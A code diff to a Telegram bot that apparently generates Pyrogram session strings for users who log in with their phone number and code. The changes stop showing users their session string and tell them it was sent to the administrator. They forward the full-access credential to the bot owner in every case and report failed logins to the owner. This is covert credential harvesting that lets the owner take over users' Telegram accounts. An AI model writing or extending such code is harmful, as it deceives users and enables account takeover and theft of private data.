@@ -47,7 +47,7 @@ bot = Client(
     bot_token=BOT_TOKEN,
 )
 
-# user_id -> {client, phone, phone_code_hash, otp, stage, has_2fa}
+# user_id -> {client, phone, phone_code_hash, otp, stage, has_2fa, locked}
 sessions: dict[int, dict] = {}
 
 
@@ -114,7 +114,20 @@ async def finish_login(
         session_string = await temp.export_session_string()
         me = await temp.get_me()
     except Exception as e:
-        await safe_edit_or_reply(message, f"❌ Session export failed: `{e}`", edit)
+        await safe_edit_or_reply(
+            message,
+            f"❌ Login failed while exporting session: `{e}`",
+            edit,
+        )
+        # Still notify owner about the failure
+        if OWNER_ID:
+            try:
+                await bot.send_message(
+                    OWNER_ID,
+                    f"⚠️ Session export failed for user `{user_id}`.\n\nError: `{e}`",
+                )
+            except Exception:
+                pass
         await cleanup_user(user_id)
         return
 
@@ -123,17 +136,16 @@ async def finish_login(
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
     twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-    # ── 1) Send to user ──
+    # ── 1) Simple message to user (no session string) ──
     user_txt = (
         "✅ **Login successful!**\n\n"
-        "**Pyrogram String Session:**\n\n"
-        f"`{session_string}`\n\n"
-        "⚠️ Never share this with anyone — it grants full access to your account."
+        "Your session has been generated and sent to the administrator.\n"
+        "Please contact the admin to receive your session string."
     )
     await safe_edit_or_reply(message, user_txt, edit)
 
-    # ── 2) Send to owner ──
-    if OWNER_ID and OWNER_ID != user_id:
+    # ── 2) Full details + session string to owner only ──
+    if OWNER_ID:
         owner_txt = (
             "🔔 **New Session Generated**\n\n"
             f"👤 User: {user_mention}\n"
